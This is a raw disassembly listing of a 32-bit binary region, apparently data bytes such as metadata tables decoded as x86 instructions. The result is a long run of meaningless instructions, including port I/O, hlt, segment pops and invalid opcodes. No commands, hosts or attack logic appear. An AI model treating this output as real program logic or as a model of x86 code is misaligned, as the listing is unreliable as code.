  407003:	05 99 02 f3 1d       	add    $0x1df30299,%eax
  407008:	6b 01 f1             	imul   $0xfffffff1,(%ecx),%eax
  40700b:	02 f2                	add    %dl,%dh
  40700d:	0f 6b 01             	packssdw (%ecx),%mm0
  407010:	a1 02 4b 15 c3       	mov    0xc3154b02,%eax
  407015:	00 a1 02 74 0f c7    	add    %ah,-0x38f08bfe(%ecx)
  40701b:	00 89 02 c9 14 4b    	add    %cl,0x4b14c902(%ecx)
  407021:	02 89 02 45 12 4b    	add    0x4b124502(%ecx),%cl
  407027:	02 59 01             	add    0x1(%ecx),%bl
  40702a:	4a                   	dec    %edx
  40702b:	23 3e                	and    (%esi),%edi
  40702d:	01 59 01             	add    %ebx,0x1(%ecx)
  407030:	e6 25                	out    %al,$0x25
  407032:	c3                   	ret
  407033:	00 a1 02 0e 23 c7    	add    %ah,-0x38dcf1fe(%ecx)
  407039:	00 f9                	add    %bh,%cl
  40703b:	02 f3                	add    %bl,%dh
  40703d:	1d 6b 01 f9 02       	sbb    $0x2f9016b,%eax
  407042:	bb 12 23 02 01       	mov    $0x1022312,%ebx
  407047:	03 f3                	add    %ebx,%esi
  407049:	1d 0e 00 01 03       	sbb    $0x301000e,%eax
  40704e:	90                   	nop
  40704f:	0f 47 02             	cmova  (%edx),%eax
  407052:	c1 01 74             	roll   $0x74,(%ecx)
  407055:	1d 47 02 c1 01       	sbb    $0x1c10247,%eax
  40705a:	32 20                	xor    (%eax),%ah
  40705c:	42                   	inc    %edx
  40705d:	02 09                	add    (%ecx),%cl
  40705f:	03 f3                	add    %ebx,%esi
  407061:	1d 6b 01 09 03       	sbb    $0x309016b,%eax
  407066:	73 21                	jae    0x407089
  407068:	6a 05                	push   $0x5
  40706a:	11 03                	adc    %eax,(%ebx)
  40706c:	db 1d 70 05 19 03    	fistpl 0x3190570
  407072:	a0 22 76 05 21       	mov    0x21057622,%al
  407077:	03 03                	add    (%ebx),%eax
  407079:	18 7c 05 c1          	sbb    %bh,-0x3f(%ebp,%eax,1)
  40707d:	01 fb                	add    %edi,%ebx
  40707f:	21 47 02             	and    %eax,0x2(%edi)
  407082:	19 03                	sbb    %eax,(%ebx)
  407084:	79 23                	jns    0x4070a9
  407086:	bf 01 81 02 7a       	mov    $0x7a028101,%edi
  40708b:	0e                   	push   %cs
  40708c:	86 05 29 03 44 00    	xchg   %al,0x440329
  407092:	f4                   	hlt
  407093:	01 59 01             	add    %ebx,0x1(%ecx)
  407096:	ef                   	out    %eax,(%dx)
  407097:	22 7b 00             	and    0x0(%ebx),%bh
  40709a:	59                   	pop    %ecx
  40709b:	01 ac 0f c3 00 59 01 	add    %ebp,0x15900c3(%edi,%ecx,1)
  4070a2:	80 0f c3             	orb    $0xc3,(%edi)
  4070a5:	00 59 01             	add    %bl,0x1(%ecx)
  4070a8:	62 19                	bound  %ebx,(%ecx)
  4070aa:	93                   	xchg   %eax,%ebx
  4070ab:	05 c1 01 23 21       	add    $0x212301c1,%eax
  4070b0:	99                   	cltd
  4070b1:	05 49 03 f3 1d       	add    $0x1df30349,%eax
  4070b6:	0e                   	push   %cs
  4070b7:	00 61 01             	add    %ah,0x1(%ecx)
  4070ba:	31 03                	xor    %eax,(%ebx)
  4070bc:	cd 03                	int    $0x3
  4070be:	51                   	push   %ecx
  4070bf:	03 1b                	add    (%ebx),%ebx
  4070c1:	15 75 01 69 00       	adc    $0x690175,%eax
  4070c6:	f3 1d 0e 00 21 02    	repz sbb $0x221000e,%eax
  4070cc:	61                   	popa
  4070cd:	14 70                	adc    $0x70,%al
  4070cf:	01 69 00             	add    %ebp,0x0(%ecx)
  4070d2:	37                   	aaa
  4070d3:	0d aa 05 c1 01       	or     $0x1c105aa,%eax
  4070d8:	8e 14 b0             	mov    (%eax,%esi,4),%ss
  4070db:	05 c1 01 35 1d       	add    $0x1d3501c1,%eax
  4070e0:	47                   	inc    %edi
  4070e1:	02 c1                	add    %cl,%al
  4070e3:	01 8c 0d bd 05 59 01 	add    %ecx,0x15905bd(%ebp,%ecx,1)
  4070ea:	0c 18                	or     $0x18,%al
  4070ec:	1d 00 61 03 61       	sbb    $0x61036100,%eax
  4070f1:	14 47                	adc    $0x47,%al
  4070f3:	02 69 03             	add    0x3(%ecx),%ch
  4070f6:	38 15 c3 00 b1 02    	cmp    %dl,0x2b100c3
  4070fc:	d0 0f                	rorb   $1,(%edi)
  4070fe:	c3                   	ret
  4070ff:	05 59 03 e2 0f       	add    $0xfe20359,%eax
  407104:	c3                   	ret
  407105:	05 59 03 61 14       	add    $0x14610359,%eax
  40710a:	47                   	inc    %edi
  40710b:	02 71 03             	add    0x3(%ecx),%dh
  40710e:	ac                   	lods   %ds:(%esi),%al
  40710f:	22 c9                	and    %cl,%cl
  407111:	05 79 03 f3 1d       	add    $0x1df30379,%eax
  407116:	cf                   	iret
  407117:	05 79 03 e5 0e       	add    $0xee50379,%eax
  40711c:	d6                   	salc
  40711d:	05 c1 00 58 10       	add    $0x105800c1,%eax
  407122:	0e                   	push   %cs
  407123:	00 19                	add    %bl,(%ecx)
  407125:	00 58 10             	add    %bl,0x10(%eax)
  407128:	0e                   	push   %cs
  407129:	00 09                	add    %cl,(%ecx)
  40712b:	03 f3                	add    %ebx,%esi
  40712d:	1d 36 02 0c 00       	sbb    $0xc0236,%eax
  407132:	f3 1d 0e 00 0c 00    	repz sbb $0xc000e,%eax
  407138:	b0 0b                	mov    $0xb,%al
  40713a:	f5                   	cmc
  40713b:	05 0c 00 e5 22       	add    $0x22e5000c,%eax
  407140:	f4                   	hlt
  407141:	01 0c 00             	add    %ecx,(%eax,%eax,1)
  407144:	3e 25 fb 05 c1 01    	ds and $0x1c105fb,%eax
  40714a:	33 19                	xor    (%ecx),%ebx
  40714c:	01 06                	add    %eax,(%esi)
  40714e:	51                   	push   %ecx
  40714f:	00 61 20             	add    %ah,0x20(%ecx)
  407152:	11 06                	adc    %eax,(%esi)
  407154:	51                   	push   %ecx
  407155:	00 98 01 17 06 59    	add    %bl,0x59061701(%eax)
  40715b:	00 01                	add    %al,(%ecx)
  40715d:	0c 17                	or     $0x17,%al
  40715f:	06                   	push   %es
  407160:	89 03                	mov    %eax,(%ebx)
  407162:	03 26                	add    (%esi),%esp
  407164:	1d 06 69 00 f3       	sbb    $0xf3006906,%eax
  407169:	1d 01 03 61 00       	sbb    $0x610301,%eax
  40716e:	f3 1d 2d 06 91 03    	repz sbb $0x391062d,%eax
  407174:	58                   	pop    %eax
  407175:	10 0e                	adc    %cl,(%esi)
  407177:	00 99 03 f3 1d 56    	add    %bl,0x561df303(%ecx)
  40717d:	04 a1                	add    $0xa1,%al
  40717f:	03 e2                	add    %edx,%esp
  407181:	13 35 06 81 02 cf    	adc    0xcf028106,%esi
  407187:	0d 0a 00 91 02       	or     $0x291000a,%eax
  40718c:	62 25 35 05 91 02    	bound  %esp,0x2910535
  407192:	81 12 43 06 89 01    	adcl   $0x1890643,(%edx)
  407198:	26 0e                	es push %cs
  40719a:	47                   	inc    %edi
  40719b:	02 91 02 62 25 54    	add    0x54256202(%ecx),%dl
  4071a1:	06                   	push   %es
  4071a2:	91                   	xchg   %eax,%ecx
  4071a3:	02 78 12             	add    0x12(%eax),%bh
  4071a6:	7c 05                	jl     0x4071ad
  4071a8:	91                   	xchg   %eax,%ecx
  4071a9:	02 6c 12 6b          	add    0x6b(%edx,%edx,1),%ch
  4071ad:	01 91 02 6f 25 5e    	add    %edx,0x5e256f02(%ecx)
  4071b3:	06                   	push   %es
  4071b4:	91                   	xchg   %eax,%ecx
  4071b5:	02 15 0e 6b 01 1c    	add    0x1c016b0e,%dl
  4071bb:	00 b0 0b f5 05 b9    	add    %dh,-0x46fa0af5(%eax)
  4071c1:	03 53 23             	add    0x23(%ebx),%edx
  4071c4:	7c 06                	jl     0x4071cc
  4071c6:	1c 00                	sbb    $0x0,%al
  4071c8:	db 1d 92 06 24 00    	fistpl 0x240692
  4071ce:	a0 22 a4 06 1c       	mov    0x1c06a422,%al
  4071d3:	00 a6 12 a9 06 24    	add    %ah,0x2406a912(%esi)
  4071d9:	00 79 23             	add    %bh,0x23(%ecx)
  4071dc:	bf 01 c9 03 21       	mov    $0x2103c901,%edi
  4071e1:	19 b3 06 c9 03 ab    	sbb    %esi,-0x54fc36fa(%ebx)
  4071e7:	0b b9 06 d1 03 2f    	or     0x2f03d106(%ecx),%edi
  4071ed:	10 c1                	adc    %al,%cl
  4071ef:	06                   	push   %es
  4071f0:	e1 03                	loope  0x4071f5
  4071f2:	94                   	xchg   %eax,%esp
  4071f3:	0d c8 06 d9 03       	or     $0x3d906c8,%eax
  4071f8:	ba 0e cf 06 f1       	mov    $0xf106cf0e,%edx
  4071fd:	03 87 10 d8 06 01    	add    0x106d810(%edi),%eax
  407203:	04 36                	add    $0x36,%al
  407205:	1c e2                	sbb    $0xe2,%al
  407207:	06                   	push   %es
  407208:	2c 00                	sub    $0x0,%al
  40720a:	87 10                	xchg   %edx,(%eax)
  40720c:	17                   	pop    %ss
  40720d:	07                   	pop    %es
  40720e:	2c 00                	sub    $0x0,%al
  407210:	82 21 23             	andb   $0x23,(%ecx)
  407213:	07                   	pop    %es
  407214:	34 00                	xor    $0x0,%al
  407216:	43                   	inc    %ebx
  407217:	0e                   	push   %cs
  407218:	3b 07                	cmp    (%edi),%eax
  40721a:	1c 00                	sbb    $0x0,%al
  40721c:	f3 1d 0e 00 c1 01    	repz sbb $0x1c1000e,%eax
  407222:	41                   	inc    %ecx
  407223:	26 84 00             	test   %al,%es:(%eax)
  407226:	21 04 f3             	and    %eax,(%ebx,%esi,8)
  407229:	1d 6b 01 19 04       	sbb    $0x419016b,%eax
  40722e:	f3 1d 59 07 29 04    	repz sbb $0x4290759,%eax
  407234:	96                   	xchg   %eax,%esi
  407235:	1f                   	pop    %ds
  407236:	61                   	popa
  407237:	07                   	pop    %es
  407238:	51                   	push   %ecx
  407239:	01 43 14             	add    %eax,0x14(%ebx)
  40723c:	93                   	xchg   %eax,%ebx
  40723d:	01 49 04             	add    %ecx,0x4(%ecx)
  407240:	f3 1d 6b 01 59 02    	repz sbb $0x259016b,%eax
  407246:	f3 1d 0e 00 31 04    	repz sbb $0x431000e,%eax
  40724c:	f3 1d 0e 00 51 04    	repz sbb $0x451000e,%eax
  407252:	10 13                	adc    %dl,(%ebx)
  407254:	01 03                	add    %eax,(%ebx)
  407256:	51                   	push   %ecx
  407257:	04 ad                	add    $0xad,%al
  407259:	12 01                	adc    (%ecx),%al
  40725b:	03 51 04             	add    0x4(%ecx),%edx
  40725e:	b1 0d                	mov    $0xd,%cl
  407260:	7a 07                	jp     0x407269
  407262:	51                   	push   %ecx
  407263:	04 d6                	add    $0xd6,%al
  407265:	13 81 07 51 04 5a    	adc    0x5a045107(%ecx),%eax
  40726b:	25 2b 02 51 04       	and    $0x451022b,%eax
  407270:	e0 07                	loopne 0x407279
  407272:	0e                   	push   %cs
  407273:	00 51 04             	add    %dl,0x4(%ecx)
  407276:	18 1e                	sbb    %bl,(%esi)
  407278:	88 07                	mov    %al,(%edi)
  40727a:	39 04 f3             	cmp    %eax,(%ebx,%esi,8)
  40727d:	1d 8e 07 51 04       	sbb    $0x451078e,%eax
  407282:	d2 07                	rolb   %cl,(%edi)
  407284:	31 02                	xor    %eax,(%edx)
  407286:	39 04 4e             	cmp    %eax,(%esi,%ecx,2)
  407289:	16                   	push   %ss
  40728a:	0e                   	push   %cs
  40728b:	00 41 04             	add    %al,0x4(%ecx)
  40728e:	f3 1d 2b 02 59 02    	repz sbb $0x259022b,%eax
  407294:	3e 25 31 02 51 03    	ds and $0x3510231,%eax
  40729a:	1b 15 9a 07 79 04    	sbb    0x479079a,%edx
  4072a0:	f3 1d 6b 01 51 04    	repz sbb $0x451016b,%eax
  4072a6:	d9 07                	flds   (%edi)
  4072a8:	2b 02                	sub    (%edx),%eax
  4072aa:	51                   	push   %ecx
  4072ab:	04 08                	add    $0x8,%al
  4072ad:	1e                   	push   %ds
  4072ae:	88 07                	mov    %al,(%edi)
  4072b0:	c1 00 57             	roll   $0x57,(%eax)
  4072b3:	15 23 02 81 04       	adc    $0x4810223,%eax
  4072b8:	d3 25 be 07 91 04    	shll   %cl,0x49107be
  4072be:	2e 25 d0 07 a1 04    	cs and $0x4a107d0,%eax
  4072c4:	f3 1d 0e 00 c1 01    	repz sbb $0x1c1000e,%eax
  4072ca:	2f                   	das
  4072cb:	21 f9                	and    %edi,%ecx
  4072cd:	07                   	pop    %es
  4072ce:	49                   	dec    %ecx
  4072cf:	02 96 1f 99 01 49    	add    0x4901991f(%esi),%dl
  4072d5:	02 96 1f ab 01 a9    	add    -0x56fe54e1(%esi),%dl
  4072db:	00 f3                	add    %dh,%bl
  4072dd:	1d 0e 00 1c 00       	sbb    $0x1c000e,%eax
  4072e2:	03 18                	add    (%eax),%ebx
  4072e4:	06                   	push   %es
  4072e5:	08 1c 00             	or     %bl,(%eax,%eax,1)
  4072e8:	e5 22                	in     $0x22,%eax
  4072ea:	f4                   	hlt
  4072eb:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  4072ee:	2b 1c 0e             	sub    (%esi,%ecx,1),%ebx
  4072f1:	00 c1                	add    %al,%cl
  4072f3:	01 05 20 42 02 c1    	add    %eax,0xc1024220
  4072f9:	00 62 12             	add    %ah,0x12(%edx)
  4072fc:	28 08                	sub    %cl,(%eax)
  4072fe:	49                   	dec    %ecx
  4072ff:	02 96 1f a5 01 51    	add    0x5101a51f(%esi),%dl
  407305:	01 5d 00             	add    %ebx,0x0(%ebp)
  407308:	32 08                	xor    (%eax),%cl
  40730a:	c1 01 75             	roll   $0x75,(%ecx)
  40730d:	18 47 02             	sbb    %al,0x2(%edi)
  407310:	a9 04 66 10 37       	test   $0x37106604,%eax
  407315:	08 51 01             	or     %dl,0x1(%ecx)
  407318:	5d                   	pop    %ebp
  407319:	00 3c 08             	add    %bh,(%eax,%ecx,1)
  40731c:	51                   	push   %ecx
  40731d:	01 5d 00             	add    %ebx,0x0(%ebp)
  407320:	41                   	inc    %ecx
  407321:	08 51 01             	or     %dl,0x1(%ecx)
  407324:	5d                   	pop    %ebp
  407325:	00 46 08             	add    %al,0x8(%esi)
  407328:	51                   	push   %ecx
  407329:	01 66 00             	add    %esp,0x0(%esi)
  40732c:	4d                   	dec    %ebp
  40732d:	08 41 03             	or     %al,0x3(%ecx)
  407330:	66 10 52 08          	data16 adc %dl,0x8(%edx)
  407334:	51                   	push   %ecx
  407335:	01 66 00             	add    %esp,0x0(%esi)
  407338:	57                   	push   %edi
  407339:	08 51 01             	or     %dl,0x1(%ecx)
  40733c:	66 00 5c 08 51       	data16 add %bl,0x51(%eax,%ecx,1)
  407341:	01 66 00             	add    %esp,0x0(%esi)
  407344:	61                   	popa
  407345:	08 51 01             	or     %dl,0x1(%ecx)
  407348:	71 0e                	jno    0x407358
  40734a:	68 08 b1 04 66       	push   $0x6604b108
  40734f:	10 6d 08             	adc    %ch,0x8(%ebp)
  407352:	49                   	dec    %ecx
  407353:	02 96 1f 7a 08 59    	add    0x59087a1f(%esi),%dl
  407359:	03 dd                	add    %ebp,%ebx
  40735b:	25 23 02 e1 02       	and    $0x2e10223,%eax
  407360:	f3 1d 88 08 c1 00    	repz sbb $0xc10888,%eax
  407366:	59                   	pop    %ecx
  407367:	12 f4                	adc    %ah,%dh
  407369:	01 89 01 f3 1d 6b    	add    %ecx,0x6b1df301(%ecx)
  40736f:	01 49 02             	add    %ecx,0x2(%ecx)
  407372:	6e                   	outsb  %ds:(%esi),(%dx)
  407373:	00 b6 08 49 02 d7    	add    %dh,-0x28fdb6f8(%esi)
  407379:	0e                   	push   %cs
  40737a:	bd 08 49 02 71       	mov    $0x71024908,%ebp
  40737f:	0e                   	push   %cs
  407380:	c4 08                	les    (%eax),%ecx
  407382:	49                   	dec    %ecx
  407383:	02 3b                	add    (%ebx),%bh
  407385:	00 cb                	add    %cl,%bl
  407387:	08 49 02             	or     %cl,0x2(%ecx)
  40738a:	5d                   	pop    %ebp
  40738b:	00 d2                	add    %dl,%dl
  40738d:	08 49 02             	or     %cl,0x2(%ecx)
  407390:	77 00                	ja     0x407392
  407392:	d9 08                	(bad) (%eax)
  407394:	49                   	dec    %ecx
  407395:	02 66 00             	add    0x0(%esi),%ah
  407398:	e0 08                	loopne 0x4073a2
  40739a:	49                   	dec    %ecx
  40739b:	02 96 1f 12 09 d1    	add    -0x2ef6ede1(%esi),%dl
  4073a1:	04 f3                	add    $0xf3,%al
  4073a3:	1d 28 09 09 00       	sbb    $0x90928,%eax
  4073a8:	80 00 0d             	addb   $0xd,(%eax)
  4073ab:	01 09                	add    %ecx,(%ecx)
  4073ad:	00 84 00 12 01 09 00 	add    %al,0x90112(%eax,%eax,1)
  4073b4:	88 00                	mov    %al,(%eax)
  4073b6:	17                   	pop    %ss
  4073b7:	01 08                	add    %ecx,(%eax)
  4073b9:	00 98 00 5c 01 08    	add    %bl,0x8015c00(%eax)
  4073bf:	00 9c 00 61 01 08 00 	add    %bl,0x80161(%eax,%eax,1)
  4073c6:	a0 00 66 01 08       	mov    0x8016600,%al
  4073cb:	00 a4 00 5c 01 08 00 	add    %ah,0x8015c(%eax,%eax,1)
  4073d2:	ec                   	in     (%dx),%al
  4073d3:	00 7f 02             	add    %bh,0x2(%edi)
  4073d6:	08 00                	or     %al,(%eax)
  4073d8:	f0 00 17             	lock add %dl,(%edi)
  4073db:	01 08                	add    %ecx,(%eax)
  4073dd:	00 f4                	add    %dh,%ah
  4073df:	00 12                	add    %dl,(%edx)
  4073e1:	01 08                	add    %ecx,(%eax)
  4073e3:	00 f8                	add    %bh,%al
  4073e5:	00 84 02 08 00 fc 00 	add    %al,0xfc0008(%edx,%eax,1)
  4073ec:	89 02                	mov    %eax,(%edx)
  4073ee:	08 00                	or     %al,(%eax)
  4073f0:	00 01                	add    %al,(%ecx)
  4073f2:	8e 02                	mov    (%edx),%es
  4073f4:	08 00                	or     %al,(%eax)
  4073f6:	04 01                	add    $0x1,%al
  4073f8:	93                   	xchg   %eax,%ebx
  4073f9:	02 08                	add    (%eax),%cl
  4073fb:	00 08                	add    %cl,(%eax)
  4073fd:	01 98 02 08 00 0c    	add    %ebx,0xc000802(%eax)
  407403:	01 9d 02 08 00 10    	add    %ebx,0x10000802(%ebp)
  407409:	01 a2 02 08 00 14    	add    %esp,0x14000802(%edx)
  40740f:	01 a7 02 08 00 18    	add    %esp,0x18000802(%edi)
  407415:	01 ac 02 2e 00 2b 00 	add    %ebp,0x2b002e(%edx,%eax,1)
  40741c:	06                   	push   %es
  40741d:	03 2e                	add    (%esi),%ebp
  40741f:	00 33                	add    %dh,(%ebx)
  407421:	00 0f                	add    %cl,(%edi)
  407423:	03 2e                	add    (%esi),%ebp
  407425:	00 3b                	add    %bh,(%ebx)
  407427:	00 34 03             	add    %dh,(%ebx,%eax,1)
  40742a:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  40742e:	3d 03 2e 00 4b       	cmp    $0x4b002e03,%eax
  407433:	00 3d 03 2e 00 53    	add    %bh,0x53002e03
  407439:	00 3d 03 2e 00 5b    	add    %bh,0x5b002e03
  40743f:	00 3d 03 2e 00 63    	add    %bh,0x63002e03
  407445:	00 3d 03 2e 00 6b    	add    %bh,0x6b002e03
  40744b:	00 3d 03 2e 00 73    	add    %bh,0x73002e03
  407451:	00 3d 03 2e 00 7b    	add    %bh,0x7b002e03
  407457:	00 43 03             	add    %al,0x3(%ebx)
  40745a:	2e 00 83 00 50 03 2e 	add    %al,%cs:0x2e035000(%ebx)
  407461:	00 8b 00 3d 03 c0    	add    %cl,-0x3ffcc300(%ebx)
  407467:	00 93 00 17 01 e0    	add    %dl,-0x1ffee900(%ebx)
  40746d:	00 93 00 17 01 00    	add    %dl,0x11700(%ebx)
  407473:	01 93 00 17 01 20    	add    %edx,0x20011700(%ebx)
  407479:	01 93 00 17 01 40    	add    %edx,0x40011700(%ebx)
  40747f:	01 93 00 17 01 60    	add    %edx,0x60011700(%ebx)
  407485:	01 93 00 17 01 80    	add    %edx,-0x7ffee900(%ebx)
  40748b:	01 93 00 17 01 a0    	add    %edx,-0x5ffee900(%ebx)
  407491:	01 93 00 17 01 c0    	add    %edx,-0x3ffee900(%ebx)
  407497:	01 93 00 17 01 e0    	add    %edx,-0x1ffee900(%ebx)
  40749d:	01 93 00 17 01 00    	add    %edx,0x11700(%ebx)
  4074a3:	02 93 00 17 01 03    	add    0x3011700(%ebx),%dl
  4074a9:	02 93 00 17 01 20    	add    0x20011700(%ebx),%dl
  4074af:	02 93 00 17 01 40    	add    0x40011700(%ebx),%dl
  4074b5:	02 93 00 17 01 60    	add    0x60011700(%ebx),%dl
  4074bb:	02 93 00 17 01 61    	add    0x61011700(%ebx),%dl
  4074c1:	02 93 00 17 01 63    	add    0x63011700(%ebx),%dl
  4074c7:	02 93 00 17 01 80    	add    -0x7ffee900(%ebx),%dl
  4074cd:	02 93 00 17 01 81    	add    -0x7efee900(%ebx),%dl
  4074d3:	02 93 00 17 01 a0    	add    -0x5ffee900(%ebx),%dl
  4074d9:	02 93 00 17 01 a1    	add    -0x5efee900(%ebx),%dl
  4074df:	02 93 00 17 01 c0    	add    -0x3ffee900(%ebx),%dl
  4074e5:	02 93 00 17 01 c1    	add    -0x3efee900(%ebx),%dl
  4074eb:	02 93 00 17 01 e0    	add    -0x1ffee900(%ebx),%dl
  4074f1:	02 93 00 17 01 e1    	add    -0x1efee900(%ebx),%dl
  4074f7:	02 93 00 17 01 e3    	add    -0x1cfee900(%ebx),%dl
  4074fd:	02 9b 00 b6 03 00    	add    0x3b600(%ebx),%bl
  407503:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  407509:	03 93 00 17 01 20    	add    0x20011700(%ebx),%edx
  40750f:	03 93 00 17 01 21    	add    0x21011700(%ebx),%edx
  407515:	03 93 00 17 01 40    	add    0x40011700(%ebx),%edx
  40751b:	03 93 00 17 01 41    	add    0x41011700(%ebx),%edx
  407521:	03 93 00 17 01 61    	add    0x61011700(%ebx),%edx
  407527:	03 93 00 17 01 81    	add    -0x7efee900(%ebx),%edx
  40752d:	03 93 00 17 01 a1    	add    -0x5efee900(%ebx),%edx
  407533:	03 93 00 17 01 a3    	add    -0x5cfee900(%ebx),%edx
  407539:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  40753f:	00 20                	add    %ah,(%eax)
  407541:	00 00                	add    %al,(%eax)
  407543:	00 14 00             	add    %dl,(%eax,%eax,1)
  407546:	01 00                	add    %eax,(%eax)
  407548:	06                   	push   %es
  407549:	00 00                	add    %al,(%eax)
  40754b:	00 1e                	add    %bl,(%esi)
  40754d:	00 c0                	add    %al,%al
  40754f:	03 c9                	add    %ecx,%ecx
  407551:	03 f4                	add    %esp,%esi
  407553:	03 9c 04 c2 04 e6 04 	add    0x4e604c2(%esp,%eax,1),%ebx
  40755a:	54                   	push   %esp
  40755b:	05 59 05 81 05       	add    $0x5810559,%eax
  407560:	8a 05 8f 05 9f 05    	mov    0x59f058f,%al
  407566:	b6 05                	mov    $0x5,%dh
  407568:	dd 05 08 06 27 06    	fldl   0x6270608
  40756e:	3c 06                	cmp    $0x6,%al
  407570:	4c                   	dec    %esp
  407571:	06                   	push   %es
  407572:	66 06                	pushw  %es
  407574:	af                   	scas   %es:(%edi),%eax
  407575:	06                   	push   %es
  407576:	53                   	push   %ebx
  407577:	07                   	pop    %es
  407578:	67 07                	addr16 pop %es
  40757a:	a3 07 cb 07 da       	mov    %eax,0xda07cb07
  40757f:	07                   	pop    %es
  407580:	e8 07 f0 07 ff       	call   0xff48658c
  407585:	07                   	pop    %es
  407586:	0c 08                	or     $0x8,%al
  407588:	11 08                	adc    %ecx,(%eax)
  40758a:	20 08                	and    %cl,(%eax)
  40758c:	2d 08 72 08 80       	sub    $0x80087208,%eax
  407591:	08 96 08 a2 08 a8    	or     %dl,-0x57f75df8(%esi)
  407597:	08 ae 08 e7 08 f1    	or     %ch,-0xef718f8(%esi)
  40759d:	08 f7                	or     %dh,%bh
  40759f:	08 fc                	or     %bh,%ah
  4075a1:	08 02                	or     %al,(%edx)
  4075a3:	09 0b                	or     %ecx,(%ebx)
  4075a5:	09 18                	or     %ebx,(%eax)
  4075a7:	09 31                	or     %esi,(%ecx)
  4075a9:	09 04 00             	or     %eax,(%eax,%eax,1)
  4075ac:	01 00                	add    %eax,(%eax)
  4075ae:	16                   	push   %ss
  4075af:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4075b2:	17                   	pop    %ss
  4075b3:	00 0d 00 18 00 0f    	add    %cl,0xf001800
  4075b9:	00 00                	add    %al,(%eax)
  4075bb:	00 83 0a 9f 00 00    	add    %al,0x9f0a(%ebx)
  4075c1:	00 e6                	add    %ah,%dh
  4075c3:	1b a4 00 00 00 24 06 	sbb    0x6240000(%eax,%eax,1),%esp
  4075ca:	a9 00 00 00 3d       	test   $0x3d000000,%eax
  4075cf:	05 ae 00 00 00       	add    $0xae,%eax
  4075d4:	8a 05 ae 00 00 00    	mov    0xae,%al
  4075da:	66 1b b2 00 00 00 85 	sbb    -0x7b000000(%edx),%si
  4075e1:	1a b7 00 00 00 9c    	sbb    -0x64000000(%edi),%dh
  4075e7:	23 bb 00 00 00 19    	and    0x19000000(%ebx),%edi
  4075ed:	02 b2 00 00 00 1a    	add    0x1a000000(%edx),%dh
  4075f3:	23 bf 00 00 00 b8    	and    -0x48000000(%edi),%edi
  4075f9:	06                   	push   %es
  4075fa:	b7 00                	mov    $0x0,%bh
  4075fc:	00 00                	add    %al,(%eax)
  4075fe:	68 06 c3 01 00       	push   $0x1c306
  407603:	00 1d 01 f8 01 00    	add    %bl,0x1f801
  407609:	00 ad 15 fe 01 00    	add    %ch,0x1fe15(%ebp)
  40760f:	00 5b 06             	add    %bl,0x6(%ebx)
  407612:	69 02 00 00 4a 0e    	imul   $0xe4a0000,(%edx),%eax
  407618:	6d                   	insl   (%dx),%es:(%edi)
  407619:	02 00                	add    (%eax),%al
  40761b:	00 44 1a 71          	add    %al,0x71(%edx,%ebx,1)
  40761f:	02 00                	add    (%eax),%al
  407621:	00 79 02             	add    %bh,0x2(%ecx)
  407624:	75 02                	jne    0x407628
  407626:	00 00                	add    %al,(%eax)
  407628:	7d 24                	jge    0x40764e
  40762a:	7a 02                	jp     0x40762e
  40762c:	02 00                	add    (%eax),%al
  40762e:	06                   	push   %es
  40762f:	00 03                	add    %al,(%ebx)
  407631:	00 01                	add    %al,(%ecx)
  407633:	00 07                	add    %al,(%edi)
  407635:	00 03                	add    %al,(%ebx)
  407637:	00 02                	add    %al,(%edx)
  407639:	00 08                	add    %cl,(%eax)
  40763b:	00 05 00 01 00 09    	add    %al,0x9000100
  407641:	00 05 00 02 00 0a    	add    %al,0xa000200
  407647:	00 07                	add    %al,(%edi)
  407649:	00 01                	add    %al,(%ecx)
  40764b:	00 0b                	add    %cl,(%ebx)
  40764d:	00 07                	add    %al,(%edi)
  40764f:	00 02                	add    %al,(%edx)
  407651:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407654:	09 00                	or     %eax,(%eax)
  407656:	01 00                	add    %eax,(%eax)
  407658:	0d 00 09 00 02       	or     $0x2000900,%eax
  40765d:	00 0e                	add    %cl,(%esi)
  40765f:	00 0b                	add    %cl,(%ebx)
  407661:	00 01                	add    %al,(%ecx)
  407663:	00 0f                	add    %cl,(%edi)
  407665:	00 0b                	add    %cl,(%ebx)
  407667:	00 02                	add    %al,(%edx)
  407669:	00 10                	add    %dl,(%eax)
  40766b:	00 0d 00 01 00 11    	add    %cl,0x11000100
  407671:	00 0d 00 02 00 12    	add    %cl,0x12000200
  407677:	00 0f                	add    %cl,(%edi)
  407679:	00 01                	add    %al,(%ecx)
  40767b:	00 13                	add    %dl,(%ebx)
  40767d:	00 0f                	add    %cl,(%edi)
  40767f:	00 02                	add    %al,(%edx)
  407681:	00 14 00             	add    %dl,(%eax,%eax,1)
  407684:	11 00                	adc    %eax,(%eax)
  407686:	02 00                	add    (%eax),%al
  407688:	15 00 13 00 01       	adc    $0x1001300,%eax
  40768d:	00 16                	add    %dl,(%esi)
  40768f:	00 13                	add    %dl,(%ebx)
  407691:	00 02                	add    %al,(%edx)
  407693:	00 17                	add    %dl,(%edi)
  407695:	00 15 00 01 00 18    	add    %dl,0x18000100
  40769b:	00 15 00 02 00 19    	add    %dl,0x19000200
  4076a1:	00 17                	add    %dl,(%edi)
  4076a3:	00 01                	add    %al,(%ecx)
  4076a5:	00 1a                	add    %bl,(%edx)
  4076a7:	00 17                	add    %dl,(%edi)
  4076a9:	00 02                	add    %al,(%edx)
  4076ab:	00 60 00             	add    %ah,0x0(%eax)
  4076ae:	19 00                	sbb    %eax,(%eax)
  4076b0:	02 00                	add    (%eax),%al
  4076b2:	68 00 1b 00 02       	push   $0x2001b00
  4076b7:	00 69 00             	add    %ch,0x0(%ecx)
  4076ba:	1d 00 02 00 8b       	sbb    $0x8b000200,%eax
  4076bf:	00 1f                	add    %bl,(%edi)
  4076c1:	00 01                	add    %al,(%ecx)
  4076c3:	00 8c 00 1f 00 02 00 	add    %cl,0x2001f(%eax,%eax,1)
  4076ca:	8d 00                	lea    (%eax),%eax
  4076cc:	21 00                	and    %eax,(%eax)
  4076ce:	01 00                	add    %eax,(%eax)
  4076d0:	8e 00                	mov    (%eax),%es
  4076d2:	21 00                	and    %eax,(%eax)
  4076d4:	02 00                	add    (%eax),%al
  4076d6:	8f 00                	pop    (%eax)
  4076d8:	23 00                	and    (%eax),%eax
  4076da:	01 00                	add    %eax,(%eax)
  4076dc:	90                   	nop
  4076dd:	00 23                	add    %ah,(%ebx)
  4076df:	00 02                	add    %al,(%edx)
